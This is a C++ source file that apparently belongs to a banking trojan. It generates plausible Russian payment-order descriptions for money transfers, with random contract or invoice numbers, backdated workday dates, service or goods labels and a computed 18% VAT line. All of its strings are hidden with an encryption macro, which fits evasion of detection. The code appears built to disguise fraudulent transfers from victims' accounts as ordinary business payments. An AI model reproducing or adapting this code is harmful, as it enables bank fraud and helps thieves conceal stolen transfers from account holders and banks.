/*
	kbriGeneratePurpose.cpp
	Transfer purpose generation routines
*/

#include <Windows.h>
#include <math.h>

#include "..\inc\dbg.h"
#include "..\inc\mem.h"
#include "..\inc\CryptoStrings.h"
#include "..\inc\RandomGen.h"

#include "kbriGeneratePurpose.h"


/*
	lstcatA() analogue, concat 2 null-terminated strings
*/
VOID kgpcat(LPSTR szDest, LPSTR szSource)
{
	BYTE *pbSrc = (BYTE *)szSource;
	BYTE *pbDest = (BYTE *)szDest;

	if (!szDest || !szSource) { return; }

	// scan for null terminator at dest
	while (*pbDest != 0x00) { pbDest++; }

	// copy chars
	while (*pbSrc != 0x00) {

		*pbDest = *pbSrc;
		pbDest++;
		pbSrc++;

	}

	return;
}

/*
	Randomly substracts a value of 0 - 100 days
*/
VOID kgpRndModifyTime(FILETIME *ft, RndClass *rg)
{
	ULARGE_INTEGER uint;

	if (!ft || !rg) { DbgPrint("ERR: invalid input params"); return; }

	// do substract in 25% of calls
	if (rg->rgGetRnd(rg, 1, 4) == 1) {

		// copy val
		uint.LowPart = ft->dwLowDateTime;
		uint.HighPart = ft->dwHighDateTime;

		// substract some rnd val
		#define FILETIME_1DAY 24 * 60 * 60 * 10000000
		uint.QuadPart -= ((UINT64)rg->rgGetRnd(rg, 1, 100) * FILETIME_1DAY);

		// save to param
		ft->dwLowDateTime = uint.LowPart;
		ft->dwHighDateTime = uint.HighPart;
	}

}


/*
	Generates some date in near past, in workdays, and append to text buffer
	DD.MM.YYYY format
	NB: no spaces added here
*/
VOID kgpAppendDate(LPSTR szDest, RndClass *rg)
{
	LPSTR szBuff = NULL;	// internal buffer
	LPSTR szS = NULL;	// decrypt buffer

	FILETIME ft = { 0 };
	SYSTEMTIME st = { 0 };

	if (!szDest) { DbgPrint("ERR: invalid input params"); return; }

	// alloc res buffer
	szBuff = (LPSTR)my_alloc(1024);

	do {

		// select date
		GetSystemTimeAsFileTime(&ft);
		kgpRndModifyTime(&ft, rg);

		// check if it is not holidays
		FileTimeToSystemTime(&ft, &st);

#ifdef _DEBUG
		if (st.wYear < 2014) { DbgPrint("WARNWARNWARN: algo error, year %u less than 2014", st.wYear); }
#endif

	} while ((st.wDayOfWeek == 0) || (st.wDayOfWeek == 6));

	// decrypt format
	szS = CRSTRA("%02u.%02u.%04u", "\xfc\xbf\xfd\x02\xf2\xbf\xb8\x5a\xbe\xb2\x53\xaf\x5c\x15\x28\x84\x69\x37\x09\xbf\x0b\x8b\x14");
	wsprintfA(szBuff, szS, st.wDay, st.wMonth, st.wYear);
	my_free(szS);


	// append result
	kgpcat(szDest, szBuff);

	// cleanup
	my_free(szBuff);

}


/*
	Rounds x10 cents value into cents only
*/
DWORD kgpRoundx10Cents(UINT64 i64Val)
{
	DWORD dwRes;

	// leave last 4 digits
	dwRes = (DWORD)(i64Val - (UINT64)((UINT64)(i64Val / 10000) * 10000));
//	DbgPrint("l4 digits = %u", dwRes);

	// check last 2 digits
	if ((dwRes - (dwRes / 100 * 100)) < 50) { dwRes = dwRes / 100; } else { dwRes = (dwRes / 100) + 1;  }

	return dwRes;
}


/*
	Calculates and appends sales tax as string, without spaces
	NB: sum is integer with cents, not K
*/
VOID kgpAppendSalesTax(LPSTR szRes, UINT64 i64Sum, RndClass *rg)
{
	LPSTR szBuff = NULL;	// tmp internal buffer
	UINT64 i64TaxValx = 0;

	LPSTR szS = NULL;	// decrypt buffer

	if (!szRes || !i64Sum) { DbgPrint("ERR: invalid input params"); return; }

	// alloc buffer
	szBuff = (LPSTR)my_alloc(1024);

	// calc sales tax (x10 value to get integer math and digit, essential for round)
	i64TaxValx = (i64Sum * 100) - (UINT64)((i64Sum * 100 * 100) / 118);

#ifdef _DEBUGx
	LPSTR szBuffA = (LPSTR)my_alloc(1024);
	_ui64toa(i64Sum, szBuffA, 10);
	DbgPrint("i64Sum=%s", szBuffA);

	_ui64toa(((i64Sum * 100 * 100) / 118), szBuffA, 10);
	DbgPrint("sum_div=%s", szBuffA);

	_ui64toa(i64TaxValx, szBuffA, 10);
	DbgPrint("ivalx=%s", szBuffA);

	my_free(szBuffA);
#endif

	// generate pattern
	switch (rg->rgGetRnd(rg, 1, 5)) {
		default: szS = CRSTRA("%u-%02u", "\xfc\x1f\x98\x01\xfb\x1f\xdd\x1c\xa1\x42\x28\xbb\x19\xf7\x1b"); break;
		case 1: szS = CRSTRA("%u.%02u", "\x00\xa0\x74\x0f\x07\xa0\x31\x12\x5e\xfd\xc4\xb5\xe5\x2a\x48"); break;
	}

	wsprintfA(szBuff, szS, (DWORD)(i64TaxValx / 100 / 100), kgpRoundx10Cents(i64TaxValx));

	my_free(szS);


	// append result
	kgpcat(szRes, szBuff);

	my_free(szBuff);

}



/*
	Generates purpose description into internally allocated buffer,
	calculating 18% sales tax
	Сумма 100000-00НДС(18%) 15254-24
*/
BOOL kgpGeneratePurpose(LPSTR *pszResult, UINT64 i64Sum)
{
	BOOL bRes = FALSE;

	RndClass rg = { 0 };	// rnd generator 

	LPSTR szS = NULL;	// decrypt buffer
	LPSTR szBuff = NULL;	// tmp wsprintf() buffer
	
	if (!pszResult || !i64Sum) { DbgPrint("ERR: invalid input params"); return bRes; }

	*pszResult = (LPSTR)my_alloc(1024);

	// prepare rnd generator
	rgNew(&rg);

	// due to very rapid process, just counter init is not sufficient here, use combined mode
	rg.rgInitSeed(&rg, i64Sum ^ (UINT64)GetTickCount());

	szBuff = (LPSTR)my_alloc(1024);

	// start of string
	szS = CRSTRA("Оплата ", "\x00\x20\x99\x0e\x07\x20\x37\x89\x9b\xb8\xeb\x66\xb0\x51\x15");
	kgpcat(*pszResult, szS);
	my_free(szS);

	switch (rg.rgGetRnd(&rg, 1, 3)) {
		case 1: szS = CRSTRA("по счету ", "\xff\x9f\x85\x0b\xf6\x9f\x0a\x8d\xaf\x16\xf2\x66\x9d\xf4\x05"); break;
		case 2: szS = CRSTRA("по договору ", "\xfe\xdf\x3e\x09\xf2\xdf\xb1\x8f\xae\x43\x50\x62\x80\xa5\x70\x51\xbd\x47\xde"); break;
		case 3: szS = CRSTRA("по контракту ", "\xfc\x7f\xf8\x00\xf1\x7f\x77\x86\xac\xed\x96\x65\x9e\x17\xb8\x42\xbe\x34\x18"); break;
	}
	kgpcat(*pszResult, szS); my_free(szS);

	// # sign
	if (rg.rgGetRnd(&rg, 1, 3) == 1) {
		szS = CRSTRA("№ ", "\xfc\xbf\x1c\x00\xfe\xbf\xc5\x48\x89\x07\x27");
		kgpcat(*pszResult, szS); my_free(szS);
	}

	// document number gen
	szS = CRSTRA("%u", "\xff\x1f\xfb\x09\xfd\x1f\xbe\x14\xd9\x86\x54");
	wsprintfA(szBuff, szS, rg.rgGetRnd(&rg, 120, 1010));
	kgpcat(*pszResult, szBuff);
	my_free(szS);

	// extra number elements
	szS = NULL;
	switch (rg.rgGetRnd(&rg, 1, 7)) {
	
	case 1: szS = CRSTRA("/2015", "\xfc\x3f\xe8\x00\xf9\x3f\xa7\x5a\xbc\x76\x5d"); break;
	case 2: szS = CRSTRA("/06", "\xfc\x7f\xf2\x02\xff\x7f\xbd\x5a\xba\x62\x37"); break;
	case 3: szS = CRSTRA("/07", "\xff\xff\x14\x0c\xfc\xff\x5b\x54\xb8\x4e\xd7"); break;

	}
	if (szS) { kgpcat(*pszResult, szS); my_free(szS); }


	// from date starting sign
	szS = CRSTRA(" от ", "\xfd\x7f\xdf\x04\xf9\x7f\x9f\x82\x7f\x27\x41");
	kgpcat(*pszResult, szS); my_free(szS);

	// date generator
	kgpAppendDate(*pszResult, &rg);

	// for what items
	szS = NULL;
	switch (rg.rgGetRnd(&rg, 1, 9)) {

		case 1: szS = CRSTRA(" за материалы", "\x00\xa0\x09\x0f\x0d\xa0\x49\x80\x90\xf8\x65\x67\x62\xdd\x59\x4f\x50\xf3\x32"); break;
		case 2: szS = CRSTRA(" за товары", "\xfc\xdf\x62\x02\xf6\xdf\x22\x8d\x6c\x87\x10\x64\x8e\xa7\x32\x51\xe7\x07\xeb"); break;
		case 3: szS = CRSTRA(" за сырье", "\x00\xc0\xb0\x0d\x09\xc0\xf0\x82\x90\x98\xc1\x7e\x60\xa4\xf5"); break;
		case 4: szS = CRSTRA(" за транспортные услуги", "\x00\x80\x99\x0e\x17\x80\xd9\x81\x90\xd8\xeb\x76\x70\xf5\xc8\x49\x5e\xc8\xab\x2b\x2b\xbd\x59\x15\x01\x93\x6a\xe5\xf8\x1b\x74"); break;
		case 5: szS = CRSTRA(" за юридические услуги", "\xff\xff\x2b\x0b\xe9\xff\x6b\x84\x6f\xa7\x55\x73\x87\x83\x63\x54\xaa\xb6\x01\x2b\xca\x07\x38\x12\xe4\xf4\xc8\xeb\x3b\xa3\xc5"); break;
		case 6: szS = CRSTRA(" за полиграфические услуги", "\xfe\x5f\x9d\x06\xe4\x5f\xdd\x89\x6e\x07\xf2\x60\x85\x2f\xde\x5e\xae\x13\xb5\x39\xcb\x76\x97\x06\xeb\x87\x6e\xff\x05\xb4\x5e\xc6\xe3\x56\xc9"); break;
	}
	if (szS) { kgpcat(*pszResult, szS); my_free(szS); }

	// sales tax heading
	switch (rg.rgGetRnd(&rg, 1, 2)) {

		case 1: szS = CRSTRA(" в т.ч. НДС 18% - ", "\xfd\x3f\xa1\x03\xef\x3f\xe1\x89\xad\xb5\x0f\x7c\x43\x87\xcc\x6f\x9c\xa7\x50\xf3\x08\xc7\x6c\xcb\x73\x6c\x31"); break;
		case 2: szS = CRSTRA(" НДС(18%) ", "\xfd\x9f\x8d\x04\xf7\x9f\xcd\xa1\x49\x36\x25\xbd\x55\x22\x04\x8c\x12\xb7\x38"); break;
		
	}
	kgpcat(*pszResult, szS); my_free(szS);

	// sales tax amount, with dot or minus sign as delimiter
	kgpAppendSalesTax(*pszResult, i64Sum, &rg);

	// all done
	bRes = TRUE;
	DbgPrint("gp gen [%s]", *pszResult);

	if (szBuff) { my_free(szBuff); }

	return bRes;
}